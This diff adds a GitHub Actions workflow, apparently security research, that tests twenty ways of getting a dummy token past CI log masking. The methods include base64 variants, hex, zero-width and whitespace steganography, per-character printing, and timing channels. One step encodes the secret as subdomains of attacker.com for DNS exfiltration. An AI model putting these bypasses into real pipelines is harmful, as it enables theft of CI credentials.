@@ -1,0 +1,221 @@
+name: GHSEC - Secret Masking Bypass v2
+
+on:
+  workflow_dispatch:
+  issues:
+    types: [opened]
+
+jobs:
+  advanced-bypass:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Setup test secret
+        run: |
+          SECRET="ghp_realistic_test_secret_value_12345"
+          echo "SECRET_LEN=${#SECRET}"
+          echo "::add-mask::$SECRET"
+        env:
+          SECRET: ghp_realistic_test_secret_value_12345
+
+      - name: Test 1 - URL-safe Base64
+        run: |
+          SECRET="ghp_realistic_test_secret_value_12345"
+          echo "urlsafe_b64: $(echo -n "$SECRET" | base64 | tr '+/' '-_' | tr -d '=')"
+
+      - name: Test 2 - Binary representation
+        run: |
+          SECRET="ghp_realistic_test_secret_value_12345"
+          echo -n "binary: "
+          echo -n "$SECRET" | while IFS= read -r -n1 char; do printf "%08d " "$(echo "obase=2;$(printf '%d' "'$char")" | bc)"; done
+          echo ""
+
+      - name: Test 3 - Morse code
+        run: |
+          SECRET="ghp_realistic_test_secret_value_12345"
+          python3 -c "
+          import sys
+          MORSE = {'a':'.-','b':'-...','c':'-.-.','d':'-..','e':'.','f':'..-.','g':'--.','h':'....','i':'..','j':'.---','k':'-.-','l':'.-..','m':'--','n':'-.','o':'---','p':'.--.','q':'--.-','r':'.-.','s':'...','t':'-','u':'..-','v':'...-','w':'.--','x':'-..-','y':'-.--','z':'--..','1':'.----','2':'..---','3':'...--','4':'....-','5':'.....','6':'-....','7':'--...','8':'---..','9':'----.','0':'-----','_':'..--.-'}
+          s = '$SECRET'.lower()
+          print('morse:', ' '.join(MORSE.get(c, c) for c in s))
+          "
+
+      - name: Test 4 - Base85 (Ascii85)
+        run: |
+          SECRET="ghp_realistic_test_secret_value_12345"
+          python3 -c "
+          import base64
+          s = b'$SECRET'
+          print('base85:', base64.b85encode(s).decode())
+          "
+
+      - name: Test 5 - Hex dump format
+        run: |
+          SECRET="ghp_realistic_test_secret_value_12345"
+          echo -n "$SECRET" | xxd
+
+      - name: Test 6 - HTML entities
+        run: |
+          SECRET="ghp_realistic_test_secret_value_12345"
+          python3 -c "
+          s = '$SECRET'
+          print('html_entities:', ''.join(f'&#{ord(c)};' for c in s))
+          "
+
+      - name: Test 7 - Emoji encoding
+        run: |
+          SECRET="ghp_realistic_test_secret_value_12345"
+          python3 -c "
+          s = '$SECRET'
+          emojis = ['😀','😂','🤣','😃','😄','😅','😆','😉','😊','😋','😎','😍','😘','🥰','😗','😙','😚','☺️','🙂','🤗','🤩','🤔','🤨','😐','😑','😶','🙄','😏','😣','😥','😮','🤐','😯','😪','😫','🥱','😴','😌','😛','😜','😝','🤤','😒','😓','😔','😕']
+          print('emoji:', ''.join(emojis[ord(c) % len(emojis)] for c in s))
+          "
+
+      - name: Test 8 - Steganography (hidden in whitespace)
+        run: |
+          SECRET="ghp_realistic_test_secret_value_12345"
+          python3 -c "
+          s = '$SECRET'
+          # Encode in trailing spaces: 1 space = 0, 2 spaces = 1
+          bits = ''.join(format(ord(c), '08b') for c in s)
+          output = 'Hello World'
+          for bit in bits:
+              output += ' ' if bit == '0' else '  '
+          print('stego:', repr(output))
+          "
+
+      - name: Test 9 - Split across lines
+        run: |
+          SECRET="ghp_realistic_test_secret_value_12345"
+          for (( i=0; i<${#SECRET}; i++ )); do
+            echo -n "${SECRET:$i:1}"
+          done
+          echo ""
+
+      - name: Test 10 - JSON with toJson
+        run: |
+          SECRET="ghp_realistic_test_secret_value_12345"
+          python3 -c "
+          import json
+          s = '$SECRET'
+          print('json_escaped:', json.dumps(s))
+          print('json_unicode:', json.dumps(s, ensure_ascii=True))
+          print('json_raw:', json.dumps(s, ensure_ascii=False))
+          "
+
+      - name: Test 11 - Zero-width characters
+        run: |
+          SECRET="ghp_realistic_test_secret_value_12345"
+          python3 -c "
+          s = '$SECRET'
+          # Zero-width joiner (U+200D) = 0, Zero-width non-joiner (U+200C) = 1
+          bits = ''.join(format(ord(c), '08b') for c in s)
+          encoded = ''
+          for bit in bits:
+              encoded += '\u200d' if bit == '0' else '\u200c'
+          print('visible: hello')
+          print('zero_width:', encoded)
+          "
+
+      - name: Test 12 - DNS subdomain encoding
+        run: |
+          SECRET="ghp_realistic_test_secret_value_12345"
+          python3 -c "
+          import base64
+          s = b'$SECRET'
+          b64 = base64.b64encode(s).decode().replace('=','').lower()
+          # Split into DNS-safe chunks
+          chunks = [b64[i:i+63] for i in range(0, len(b64), 63)]
+          for i, chunk in enumerate(chunks):
+              print(f'dns_{i}: {chunk}.attacker.com')
+          "
+
+      - name: Test 13 - Time-based exfil
+        run: |
+          SECRET="ghp_realistic_test_secret_value_12345"
+          python3 -c "
+          import time
+          s = '$SECRET'
+          # Leak via timing: sleep 100ms per char value
+          for c in s:
+              delay = ord(c) / 1000.0
+              time.sleep(delay)
+              print(f'char_delay: {delay:.3f}s')
+          "
+
+      - name: Test 14 - Error message embedding
+        run: |
+          SECRET="ghp_realistic_test_secret_value_12345"
+          python3 -c "
+          s = '$SECRET'
+          # Try to put secret in error message format
+          print('::error title=Build Failed::Compilation error at offset', len(s))
+          print('::warning::Deprecated API usage in module', s[:5])
+          "
+
+      - name: Test 15 - File size encoding
+        run: |
+          SECRET="ghp_realistic_test_secret_value_12345"
+          python3 -c "
+          import os
+          s = '$SECRET'
+          # Create files with sizes matching byte values
+          for i, c in enumerate(s):
+              path = f'/tmp/ghsec_size_{i}'
+              with open(path, 'w') as f:
+                  f.write('x' * ord(c))
+              size = os.path.getsize(path)
+              print(f'file_{i}: size={size}')
+          "
+
+      - name: Test 16 - Exit code encoding
+        run: |
+          SECRET="ghp_realistic_test_secret_value_12345"
+          python3 -c "
+          s = '$SECRET'
+          # Exit with code matching first byte
+          code = ord(s[0]) % 256
+          print(f'exit_code_would_be: {code}')
+          "
+
+      - name: Test 17 - Git config leak
+        run: |
+          SECRET="ghp_realistic_test_secret_value_12345"
+          git config --global user.email "test@example.com"
+          git config --global user.name "Test User"
+          # Try to set a config value with the secret
+          git config --global "ghsec.test" "$SECRET"
+          git config --global --list | grep ghsec || echo "Config not visible in list"
+
+      - name: Test 18 - Process name leak
+        run: |
+          SECRET="ghp_realistic_test_secret_value_12345"
+          # Start a process with secret in argv[0]
+          python3 -c "
+          import os
+          import sys
+          s = '$SECRET'
+          print('argv_test: starting process with secret in args')
+          # Can't easily change argv[0] from Python but we can test env
+          os.environ['GHSEC_SECRET'] = s
+          print('env_set: GHSEC_SECRET=', len(s))
+          "
+
+      - name: Test 19 - HTTP header encoding
+        run: |
+          SECRET="ghp_realistic_test_secret_value_12345"
+          python3 -c "
+          import base64
+          s = b'$SECRET'
+          print('basic_auth:', 'Basic ' + base64.b64encode(b'user:' + s).decode())
+          print('bearer:', 'Bearer ' + s.decode())
+          "
+
+      - name: Test 20 - QR code / barcode encoding
+        run: |
+          SECRET="ghp_realistic_test_secret_value_12345"
+          python3 -c "
+          s = '$SECRET'
+          # Generate a simple pattern that could be scanned
+          pattern = ''.join(['██' if ((ord(c) >> bit) & 1) else '  ' for c in s for bit in range(8)])
+          print('pattern_len:', len(pattern))
+          "
